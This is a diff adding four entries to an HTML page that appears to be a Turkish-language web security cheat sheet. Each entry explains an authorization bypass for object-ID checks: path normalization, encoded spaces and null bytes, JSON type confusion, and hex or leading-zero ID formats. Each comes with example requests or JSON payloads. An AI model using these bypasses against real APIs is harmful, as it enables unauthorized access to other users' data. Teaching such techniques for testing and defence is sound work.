@@ -2031,6 +2031,47 @@ baslangic: {
                         </div>
                     </details>
                 </li>
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                    <details>
+                        <summary style="cursor:pointer;font-weight:bold;">16. Path Normalization Bypass (URL Trick)</summary>
+                        <div style="margin-top:10px;">
+                            <strong>Zafiyet:</strong> Yetki kontrolü yapan katmanın (WAF/Proxy) tam URL'ye bakması, ancak backend'in URL'yi temizleyerek (normalize ederek) işlemesi.
+                            <pre style="margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;">// 403 Forbidden dönen orijinal istek:\nGET /api/v1/users/99\n\n// Bypass Denemeleri:\nGET /api/v1/users/99/ (Sona slash)\nGET /api/v1//users//99 (Çift slash)\nGET /api/v1/users/./99 (Nokta operatörü)</pre>
+                        </div>
+                    </details>
+                </li>
+
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                    <details>
+                        <summary style="cursor:pointer;font-weight:bold;">17. Encoded Space & Unicode Trick (Winner Technique)</summary>
+                        <div style="margin-top:10px;">
+                            <strong>Zafiyet:</strong> ID parametresinin yanına eklenen özel karakterlerin, yetki kontrolü aşamasında "farklı bir ID" gibi algılanıp, veritabanı sorgusu aşamasında temizlenerek "hedef ID"ye dönüşmesi.
+                            <pre style="margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;">// Kurbanın projesine erişim:\nGET /api/projects/99%20 (Sona boşluk)\nGET /api/projects/%2099 (Başa boşluk)\nGET /api/projects/99%00 (Null Byte)</pre>
+                            <div class="small" style="margin-top:5px;">Katmanlar arası "Normalization" farkı zafiyeti tetikler.</div>
+                        </div>
+                    </details>
+                </li>
+
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                    <details>
+                        <summary style="cursor:pointer;font-weight:bold;">18. JSON Type Confusion (String/Array Bypass)</summary>
+                        <div style="margin-top:10px;">
+                            <strong>Zafiyet:</strong> Backend'in sadece "Integer" bekleyen bir kontrol mekanizmasına sahip olması, ancak gelen veriyi otomatik olarak tip dönüşümüne (type casting) sokması.
+                            <pre style="margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;">// Orijinal (403):\n{"user_id": 99}\n\n// Bypass:\n{"user_id": "99"} (String olarak yolla)\n{"user_id": [99]} (Array içinde yolla)\n{"user_id": {"user_id": 99}} (Nested object)</pre>
+                        </div>
+                    </details>
+                </li>
+
+                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">
+                    <details>
+                        <summary style="cursor:pointer;font-weight:bold;">19. Numeric Formatting & Hex Bypass</summary>
+                        <div style="margin-top:10px;">
+                            <strong>Zafiyet:</strong> Yetki kontrolü yapan sistemin sayıları sadece düz formatta tanıması, ancak uygulamanın farklı sayı sistemlerini (Hex, Octal) çözümleyebilmesi.
+                            <pre style="margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;">// Hedef ID: 99\nGET /api/data/099 (Leading zeros)\nGET /api/data/0x63 (Hex format)\nGET /api/data/+99 (Pozitif işareti)</pre>
+                        </div>
+                    </details>
+                </li>
+                
             </ul>`
           },
         ]
@@ -6364,3 +6405,4 @@ view</textarea>
   </button>
 </body>
 </html>
+
